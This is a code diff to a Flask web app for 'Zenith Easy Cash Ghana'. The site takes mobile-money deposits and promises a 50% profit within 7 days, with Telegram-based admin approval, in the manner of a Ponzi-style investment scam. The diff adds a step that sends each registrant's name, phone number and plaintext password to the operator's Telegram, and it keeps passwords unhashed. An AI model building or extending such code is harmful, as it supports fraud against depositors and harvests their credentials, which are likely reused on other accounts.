@@ -116,6 +116,7 @@ def save_investor_data(data):
   found_user = False
   for inv in investors:
     if inv.get("number") == number:
+      inv["password"] = data.get("password", inv.get("password"))
       if "investments" not in inv:
         inv["investments"] = [
             {
@@ -124,7 +125,7 @@ def save_investor_data(data):
                 "transaction_id": inv.get("transaction_id"),
                 "screenshot": inv.get("screenshot"),
                 "date_time": inv.get("date_time"),
-                "maturity_date": inv.get("maturity_date"),
+                "maturity_date": inv.get("maturity_date", "Pending Approval"),
                 "status": inv.get("status"),
             }
         ]
@@ -198,41 +199,23 @@ ZENITH_ALERTS_TOP_HTML = """
 </script>
 """
 
-POPUP_MODAL_CSS = """
-<style>
-    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.7); display: flex; justify-content: center; align-items: center; z-index: 9999; }
-    .modal-card { background: #1e1e1e; color: #fff; width: 90%; max-width: 450px; padding: 30px; border-radius: 16px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-    .icon-container { width: 90px; height: 90px; margin: 0 auto 20px auto; background: #2e7d32; border-radius: 50%; display: flex; justify-content: center; align-items: center; }
-    .checkmark { font-size: 45px; color: white; font-weight: bold; }
-    .modal-card h3 { color: #4caf50; font-size: 24px; margin-bottom: 10px; }
-    .modal-card p { color: #ccc; font-size: 15px; line-height: 1.5; margin-bottom: 20px; }
-    .modal-btn { background: linear-gradient(135deg, #2e7d32, #4caf50); color: white; border: none; padding: 12px 25px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; width: 100%; text-decoration: none; display: inline-block; box-sizing: border-box; margin-top: 10px; }
-    .telegram-quick-btn { background: linear-gradient(135deg, #0088cc, #229ed9); }
-</style>
-<div class="modal-overlay" id="successModal">
-    <div class="modal-card">
-        <div class="icon-container"><div class="checkmark">✓</div></div>
-        <h3>{{ modal_title }}</h3>
-        <p>{{ modal_desc|safe }}</p>
-        <a href="{{ admin_telegram_link }}" target="_blank" class="modal-btn telegram-quick-btn">💬 Chat Admin on Telegram for Quick Approval</a>
-        <button class="modal-btn" onclick="closeModal()" style="background: #444; margin-top: 8px;">Continue to Login</button>
-    </div>
-</div>
-<script>function closeModal() { window.location.href = "{{ url_for('login') }}"; }</script>
-"""
-
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Zenith Easy Cash Ghana - Online Registration & Tracking</title>
+    <title>Zenith Easy Cash Ghana - Registration & Portal</title>
     <style>
         body { font-family: Arial, sans-serif; background-color: #f4f7f6; color: #333; margin: 0; padding: 20px; }
         .container { max-width: 650px; background: #fff; padding: 30px; margin: auto; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); margin-bottom: 25px; }
         h2, h3 { color: #028a0f; text-align: center; }
-        .instructions { background: #e8f5e9; padding: 15px; border-left: 5px solid #2e7d32; margin-bottom: 20px; font-size: 14px; line-height: 1.6; }
+        
+        .process-guide { background: #111827; color: #f8fafc; padding: 20px; border-radius: 8px; margin-bottom: 20px; border-left: 5px solid #22c55e; }
+        .process-guide h4 { color: #4ade80; margin-top: 0; margin-bottom: 10px; font-size: 16px; }
+        .process-steps { margin: 0; padding-left: 18px; font-size: 13px; line-height: 1.7; }
+        .process-steps li { margin-bottom: 6px; }
+        
         .momo-box { background: #fff8e1; border: 1px dashed #ffa000; padding: 15px; margin-bottom: 20px; border-radius: 5px; text-align: center; }
         .form-group { margin-bottom: 15px; }
         label { display: block; font-weight: bold; margin-bottom: 5px; }
@@ -244,7 +227,6 @@ HTML_TEMPLATE = """
         .nav-links a { color: #028a0f; text-decoration: none; font-weight: bold; }
         .telegram-float-btn { display: block; background: #0088cc; color: white; text-align: center; padding: 10px; border-radius: 4px; margin-top: 15px; text-decoration: none; font-weight: bold; font-size: 14px; }
         
-        /* Standalone Tracker Card */
         .tracker-section { background: #f0fdf4; border: 2px solid #22c55e; padding: 25px; border-radius: 8px; margin-top: 30px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
         .tracker-result-box { margin-top: 20px; background: #fff; padding: 15px; border-radius: 6px; border: 1px solid #cbd5e1; display: none; }
         .tracker-slot { border-bottom: 1px solid #eee; padding-bottom: 12px; margin-bottom: 12px; }
@@ -257,17 +239,20 @@ HTML_TEMPLATE = """
         <h2>Zenith Easy Cash Ghana</h2>
         <h3>Online Investor Registration & Portal</h3>
 
-        <div class="instructions">
-            <strong>Investment Guidelines & Payout Structure:</strong>
-            <ul>
-                <li>Minimum Investment: <strong>200 GHs</strong> | Maximum Investment: <strong>500,000 GHs</strong></li>
-                <li>Standard Returns: <strong>50% Profit Payout</strong> upon maturity!</li>
-            </ul>
+        <!-- STEP BY STEP PROCESS GUIDE -->
+        <div class="process-guide">
+            <h4>📋 Simple Registration & Investment Process</h4>
+            <ol class="process-steps">
+                <li><b>Step 1: Send Your Capital</b> – Transfer your investment amount (Min 200 GHs) directly to the Official Company MoMo details provided below.</li>
+                <li><b>Step 2: Complete the Form</b> – Fill in your details, account password, and paste your MoMo Transaction ID or attach receipt screenshot.</li>
+                <li><b>Step 3: Admin Instant Verification</b> – Upon submission, your details are instantly routed for account approval.</li>
+                <li><b>Step 4: Investment Start & Payout</b> – Your 7-day maturity countdown starts immediately after admin approval to yield your <b>50% profit payout</b>!</li>
+            </ol>
         </div>
 
         <div class="momo-box">
-            <strong>COMPANY MOMO NUMBER:</strong> {{ settings.momo_number }}<br>
-            <strong>NAME:</strong> {{ settings.momo_name }}
+            <strong>OFFICIAL COMPANY MOMO NUMBER:</strong> {{ settings.momo_number }}<br>
+            <strong>ACCOUNT NAME:</strong> {{ settings.momo_name }}
         </div>
 
         {% with messages = get_flashed_messages() %}
@@ -303,16 +288,13 @@ HTML_TEMPLATE = """
             </div>
             <div class="form-group">
                 <label>Payment Proof (Transaction ID OR Screenshot):</label>
-                <div style="background:#f9f9f9; padding:10px; border-radius:4px; margin-bottom:8px; font-size:12px; color:#444;">
-                    ℹ️ <b>Instructions:</b> Send your capital investment to the company MoMo number above first, then provide your Transaction ID or upload your receipt screenshot below for confirmation.
-                </div>
                 <input type="text" name="transaction_id" placeholder="Enter MoMo Transaction ID">
                 <div style="margin-top: 8px;">
                     <input type="file" name="payment_screenshot" accept="image/*" style="border:none; padding:0;">
                     <small style="color: #666;">Upload payment screenshot image</small>
                 </div>
             </div>
-            <button type="submit">Submit Registration & Investment</button>
+            <button type="submit">Submit Registration & Open Dashboard</button>
         </form>
 
         <a href="{{ admin_telegram_link }}" target="_blank" class="telegram-float-btn">💬 Instant Admin Approval via Telegram</a>
@@ -320,13 +302,15 @@ HTML_TEMPLATE = """
             <a href="{{ url_for('login') }}">🔑 Investor Login</a>
         </div>
 
-        <!-- STANDALONE TRACKING SECTION ON HOME PAGE -->
+        <!-- STANDALONE TRACKER REQUIRING PHONE & PASSWORD -->
         <div class="tracker-section">
             <h3 style="color: #15803d; margin-top:0;">🔍 Track Your Investment Live</h3>
-            <p style="font-size: 13px; color: #475569; text-align: center;">Enter your registered phone number below to instantly view your investment status and live progress without logging in.</p>
+            <p style="font-size: 13px; color: #475569; text-align: center;">Enter your registered Phone Number & Password below to check your live status.</p>
             <div class="form-group">
                 <label style="font-size: 13px;">Registered Phone Number:</label>
                 <input type="text" id="trackNumberInput" placeholder="e.g., 0501234567" style="margin-bottom: 8px;">
+                <label style="font-size: 13px;">Account Password:</label>
+                <input type="password" id="trackPasswordInput" placeholder="Enter password" style="margin-bottom: 8px;">
                 <button type="button" onclick="trackInvestment()" style="background: #028a0f; padding: 10px;">Check Status Now</button>
             </div>
             <div id="trackerResultBox" class="tracker-result-box">
@@ -338,11 +322,12 @@ HTML_TEMPLATE = """
     <script>
         async function trackInvestment() {
             const num = document.getElementById('trackNumberInput').value.trim();
+            const pass = document.getElementById('trackPasswordInput').value.trim();
             const box = document.getElementById('trackerResultBox');
             const content = document.getElementById('trackerContent');
             
-            if (!num) {
-                alert('Please enter a phone number to track.');
+            if (!num || !pass) {
+                alert('Please enter both your phone number and password to track.');
                 return;
             }
 
@@ -350,7 +335,11 @@ HTML_TEMPLATE = """
             content.innerHTML = 'Searching records...';
 
             try {
-                const response = await fetch('/api/track/' + encodeURIComponent(num));
+                const response = await fetch('/api/track', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ number: num, password: pass })
+                });
                 const data = await response.json();
 
                 if (data.success) {
@@ -367,15 +356,13 @@ HTML_TEMPLATE = """
                     });
                     content.innerHTML = html;
                 } else {
-                    content.innerHTML = `<span style="color: #dc2626;">❌ No investment records found for phone number: <b>${num}</b></span>`;
+                    content.innerHTML = `<span style="color: #dc2626;">❌ ${data.message || 'Invalid phone number or password.'}</span>`;
                 }
             } catch (err) {
                 content.innerHTML = `<span style="color: #dc2626;">An error occurred while tracking. Please try again.</span>`;
             }
         }
     </script>
-
-    {% if show_modal %}{{ popup_html|safe }}{% endif %}
 </body>
 </html>
 """
@@ -439,6 +426,8 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         h2 { color: #028a0f; margin-top: 0; }
         .logout { float: right; }
         .logout a { background: #c62828; color: white; padding: 6px 12px; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 13px; }
+        .home-link-top { margin-bottom: 15px; font-size: 14px; }
+        .home-link-top a { color: #028a0f; text-decoration: none; font-weight: bold; }
         .card { background: #f1f8e9; padding: 18px; border-radius: 6px; margin-top: 18px; border-left: 5px solid #2e7d32; line-height: 1.6; }
         .btn-withdraw { background: #028a0f; color: white; padding: 10px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; width: 100%; text-align: center; box-sizing: border-box; }
         .btn-topup-toggle { background: #ffa000; color: white; padding: 8px 15px; text-decoration: none; border-radius: 4px; display: inline-block; font-weight: bold; margin-top: 10px; border: none; cursor: pointer; }
@@ -447,7 +436,7 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         .spinner { width: 14px; height: 14px; border: 2px solid #0369a1; border-top: 2px solid transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .countdown-live-box { background: #0f172a; color: #38bdf8; padding: 10px; border-radius: 6px; font-family: monospace; font-size: 13px; margin-top: 8px; text-align: center; font-weight: bold; }
-        .flash { background: #ffebee; color: #c62828; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; }
+        .flash { background: #e0f2fe; color: #0369a1; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; font-weight: bold; }
         .side-ticker-item { background: #1e293b; border-left: 3px solid #00ff66; padding: 10px; margin-bottom: 10px; border-radius: 4px; font-size: 12px; }
         .side-ticker-item b { color: #facc15; }
         .company-momo-display { background: #fff3cd; border: 1px solid #ffeeba; padding: 10px; border-radius: 4px; margin-bottom: 10px; font-size: 13px; color: #856404; text-align: center; }
@@ -456,6 +445,7 @@ INVESTOR_DASHBOARD_TEMPLATE = """
 <body>
     <div class="main-layout">
         <div class="dashboard-container">
+            <div class="home-link-top"><a href="{{ url_for('index') }}">← Back to Home Page</a></div>
             <div>
                 <h2>Welcome, {{ investor_name }}</h2>
                 <div class="logout"><a href="{{ url_for('logout') }}">Logout</a></div>
@@ -474,17 +464,21 @@ INVESTOR_DASHBOARD_TEMPLATE = """
                     <p><strong>Capital Invested:</strong> GHs {{ "%.2f"|format(inv.amount) }} <span style="color:#028a0f; font-size:12px;">(+50% Expected Payout: GHs {{ "%.2f"|format(inv.expected_return) }})</span></p>
                     <p><strong>Payment Proof / ID:</strong> {{ inv.transaction_id }}</p>
                     <p><strong>Registered On:</strong> {{ inv.date_time }}</p>
-                    <p><strong>Maturity Date Target:</strong> <span style="color: #028a0f; font-weight: bold;">{{ inv.maturity_date }}</span></p>
+                    <p><strong>Maturity Target Date:</strong> <span style="color: #028a0f; font-weight: bold;">{{ inv.maturity_date }}</span></p>
                     
                     <p><strong>Live Tracker:</strong>
                         <div class="countdown-live-box" data-maturity="{{ inv.maturity_date }}" id="tracker_{{ loop.index0 }}">
-                            Calculating remaining time...
+                            {% if inv.maturity_date == 'Pending Approval' %}
+                                ⏳ Timer will start counting once payment is verified by Admin.
+                            {% else %}
+                                Calculating remaining time...
+                            {% endif %}
                         </div>
                     </p>
 
                     <p><strong>Status:</strong> 
                         {% if inv.status == 'Pending Admin Payment Confirmation' %}
-                            <span style="color: #c2410c;">⏳ Pending Admin Confirmation</span>
+                            <span style="color: #c2410c; font-weight: bold;">⏳ Pending Admin Approval</span>
                         {% elif inv.status == 'Payment Confirmed & Active' %}
                             <div class="loading-badge">
                                 <div class="spinner"></div> Active & Yielding 50% Profit...
@@ -543,6 +537,9 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         function updateTrackers() {
             document.querySelectorAll('.countdown-live-box').forEach(el => {
                 const targetStr = el.getAttribute('data-maturity');
+                if (!targetStr || targetStr === 'Pending Approval') {
+                    return;
+                }
                 const targetDate = new Date(targetStr.replace(/-/g, "/"));
                 const now = new Date();
                 const diff = Math.floor((targetDate - now) / 1000);
@@ -697,7 +694,7 @@ ADMIN_DASHBOARD_TEMPLATE = """
                         <td>
                             {% if item.status == 'Pending Admin Payment Confirmation' %}
                                 <form action="{{ url_for('confirm_payment', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;">
-                                    <button type="submit" class="btn-action">Confirm</button>
+                                    <button type="submit" class="btn-action">Approve & Start Timer</button>
                                 </form>
                             {% elif item.status == 'Withdrawal Requested' %}
                                 <form action="{{ url_for('complete_withdrawal', parent_idx=item.parent_idx, sub_idx=item.sub_idx) }}" method="POST" style="display:inline;">
@@ -735,6 +732,11 @@ def index():
         return redirect(url_for("index"))
 
       password = request.form.get("password", "").strip()
+      number = request.form.get("number", "").strip()
+      name = request.form.get("name", "").strip()
+      work = request.form.get("work", "").strip()
+      region = request.form.get("region", "").strip()
+
       if not password:
         flash("Please provide a secure account password.")
         return redirect(url_for("index"))
@@ -752,15 +754,14 @@ def index():
         return redirect(url_for("index"))
 
       now = datetime.now()
-      maturity = now + timedelta(days=7)
       expected_return = amount * 1.5
 
       investor_data = {
-          "name": request.form["name"],
-          "number": request.form["number"].strip(),
+          "name": name,
+          "number": number,
           "password": password,
-          "work": request.form["work"],
-          "region": request.form["region"],
+          "work": work,
+          "region": region,
           "amount": amount,
           "expected_return": expected_return,
           "transaction_id": transaction_id
@@ -768,34 +769,39 @@ def index():
           else "Uploaded Screenshot",
           "screenshot": filename,
           "date_time": now.strftime("%Y-%m-%d %H:%M:%S"),
-          "maturity_date": maturity.strftime("%Y-%m-%d %H:%M:%S"),
+          "maturity_date": "Pending Approval",
           "status": "Pending Admin Payment Confirmation",
       }
 
       save_investor_data(investor_data)
+
+      telegram_message = (
+          f"🚨 <b>NEW USER REGISTRATION</b>\n\n"
+          f"👤 <b>Full Name:</b> {name}\n"
+          f"📞 <b>Phone Number:</b> {number}\n"
+          f"🔑 <b>Account Password:</b> {password}\n"
+          f"💼 <b>Work/Job:</b> {work}\n"
+          f"📍 <b>Region/Town:</b> {region}\n"
+          f"💰 <b>Capital Amount:</b> GHs {amount:,.2f}\n"
+          f"🎯 <b>Expected Return:</b> GHs {expected_return:,.2f}\n"
+          f"💳 <b>Transaction ID:</b> {transaction_id if transaction_id else 'Attached Screenshot'}\n"
+          f"⏰ <b>Registration Time:</b> {now.strftime('%Y-%m-%d %H:%M:%S')}"
+      )
+
       send_telegram_alert(
-          f"🚨 <b>NEW INVESTMENT SUBMISSION</b>\n👤 Name: {investor_data['name']}\n📞 Number: {investor_data['number']}\n💰 Capital: GHs {amount}",
+          telegram_message,
           os.path.join(app.config["UPLOAD_FOLDER"], filename)
           if filename
           else None,
       )
 
-      modal_title = "Successfully Registered!"
-      modal_desc = f"Your investment of <b>GHs {amount:,.2f}</b> has been submitted successfully.<br>Log in anytime using your phone number and password."
-      popup_html = (
-          POPUP_MODAL_CSS.replace("{{ modal_title }}", modal_title)
-          .replace("{{ modal_desc }}", modal_desc)
-          .replace("{{ admin_telegram_link }}", ADMIN_TELEGRAM_LINK)
+      session.permanent = True
+      session["investor_number"] = number
+      flash(
+          "Registration Successful! Welcome to your Investor Portal Dashboard."
       )
+      return redirect(url_for("dashboard"))
 
-      return render_template_string(
-          HTML_TEMPLATE,
-          settings=settings,
-          show_modal=True,
-          popup_html=popup_html,
-          admin_telegram_link=ADMIN_TELEGRAM_LINK,
-          zenith_alerts_top_html=ZENITH_ALERTS_TOP_HTML,
-      )
     except ValueError:
       flash("Invalid input. Please check your data.")
       return redirect(url_for("index"))
@@ -803,18 +809,23 @@ def index():
   return render_template_string(
       HTML_TEMPLATE,
       settings=settings,
-      show_modal=False,
       admin_telegram_link=ADMIN_TELEGRAM_LINK,
       zenith_alerts_top_html=ZENITH_ALERTS_TOP_HTML,
   )
 
 
-# Standalone tracking API endpoint (separate from profile login)
-@app.route("/api/track/<number>", methods=["GET"])
-def api_track(number):
+@app.route("/api/track", methods=["POST"])
+def api_track():
+  data = request.get_json() or {}
+  number = data.get("number", "").strip()
+  password = data.get("password", "").strip()
+
   investors = load_investors()
   for inv in investors:
-    if inv.get("number") == number.strip():
+    if inv.get("number") == number:
+      if inv.get("password") != password:
+        return jsonify({"success": False, "message": "Incorrect Password."})
+
       inv_list = inv.get("investments", [])
       if not inv_list and "amount" in inv:
         inv_list = [
@@ -823,7 +834,7 @@ def api_track(number):
                 "expected_return": inv.get(
                     "expected_return", inv.get("amount") * 1.5
                 ),
-                "maturity_date": inv.get("maturity_date"),
+                "maturity_date": inv.get("maturity_date", "Pending Approval"),
                 "status": inv.get("status"),
             }
         ]
@@ -832,7 +843,7 @@ def api_track(number):
         cleaned_investments.append({
             "amount": slot.get("amount"),
             "expected_return": slot.get("expected_return", slot.get("amount") * 1.5),
-            "maturity_date": slot.get("maturity_date"),
+            "maturity_date": slot.get("maturity_date", "Pending Approval"),
             "status": slot.get("status"),
         })
       return jsonify({
@@ -840,7 +851,10 @@ def api_track(number):
           "name": inv.get("name"),
           "investments": cleaned_investments,
       })
-  return jsonify({"success": False})
+
+  return jsonify(
+      {"success": False, "message": "No account found with this phone number."}
+  )
 
 
 @app.route("/login", methods=["GET", "POST"])
@@ -883,7 +897,7 @@ def dashboard():
                 "transaction_id": inv.get("transaction_id"),
                 "screenshot": inv.get("screenshot"),
                 "date_time": inv.get("date_time"),
-                "maturity_date": inv.get("maturity_date"),
+                "maturity_date": inv.get("maturity_date", "Pending Approval"),
                 "status": inv.get("status"),
             }
         ]
@@ -894,16 +908,20 @@ def dashboard():
         if "expected_return" not in slot_copy:
           slot_copy["expected_return"] = slot_copy["amount"] * 1.5
 
-        try:
-          maturity_dt = datetime.strptime(
-              slot_copy["maturity_date"], "%Y-%m-%d %H:%M:%S"
-          )
-          slot_copy["can_withdraw"] = (
-              now >= maturity_dt
-              and slot_copy["status"] == "Payment Confirmed & Active"
-          )
-        except Exception:
-          slot_copy["can_withdraw"] = False
+        maturity_str = slot_copy.get("maturity_date", "Pending Approval")
+        slot_copy["can_withdraw"] = False
+
+        if maturity_str != "Pending Approval":
+          try:
+            maturity_dt = datetime.strptime(
+                maturity_str, "%Y-%m-%d %H:%M:%S"
+            )
+            slot_copy["can_withdraw"] = (
+                now >= maturity_dt
+                and slot_copy["status"] == "Payment Confirmed & Active"
+            )
+          except Exception:
+            pass
 
         investments_found.append(slot_copy)
 
@@ -939,14 +957,13 @@ def topup(sub_idx):
           file.save(os.path.join(app.config["UPLOAD_FOLDER"], filename))
 
         now = datetime.now()
-        maturity = now + timedelta(days=7)
         new_investment = {
             "amount": topup_amt,
             "expected_return": topup_amt * 1.5,
             "transaction_id": topup_proof if topup_proof else "Screenshot attached",
             "screenshot": filename,
             "date_time": now.strftime("%Y-%m-%d %H:%M:%S"),
-            "maturity_date": maturity.strftime("%Y-%m-%d %H:%M:%S"),
+            "maturity_date": "Pending Approval",
             "status": "Pending Admin Payment Confirmation",
         }
 
@@ -956,13 +973,13 @@ def topup(sub_idx):
         save_all_investors(investors)
 
         send_telegram_alert(
-            f"📈 <b>NEW TOP-UP / MULTIPLE INVESTMENT</b>\n👤 Name: {inv['name']}\n📞 Number: {number}\n➕ Capital Added: GHs {topup_amt}",
+            f"📈 <b>NEW TOP-UP SUBMISSION</b>\n👤 Name: {inv['name']}\n📞 Number: {number}\n➕ Capital: GHs {topup_amt}",
             os.path.join(app.config["UPLOAD_FOLDER"], filename)
             if filename
             else None,
         )
         flash("Top-up submitted successfully for confirmation!")
-  except Exception as e:
+  except Exception:
     flash("Invalid top-up submission.")
   return redirect(url_for("dashboard"))
 
@@ -1016,7 +1033,7 @@ def admin_dashboard():
               "transaction_id": inv.get("transaction_id"),
               "screenshot": inv.get("screenshot"),
               "date_time": inv.get("date_time"),
-              "maturity_date": inv.get("maturity_date"),
+              "maturity_date": inv.get("maturity_date", "Pending Approval"),
               "status": inv.get("status"),
           }
       ]
@@ -1060,6 +1077,9 @@ def confirm_payment(parent_idx, sub_idx):
     inv_list = investors[parent_idx].get("investments", [])
     if 0 <= sub_idx < len(inv_list):
       inv_list[sub_idx]["status"] = "Payment Confirmed & Active"
+      now = datetime.now()
+      maturity = now + timedelta(days=7)
+      inv_list[sub_idx]["maturity_date"] = maturity.strftime("%Y-%m-%d %H:%M:%S")
       save_all_investors(investors)
   return redirect(url_for("admin_dashboard"))
 
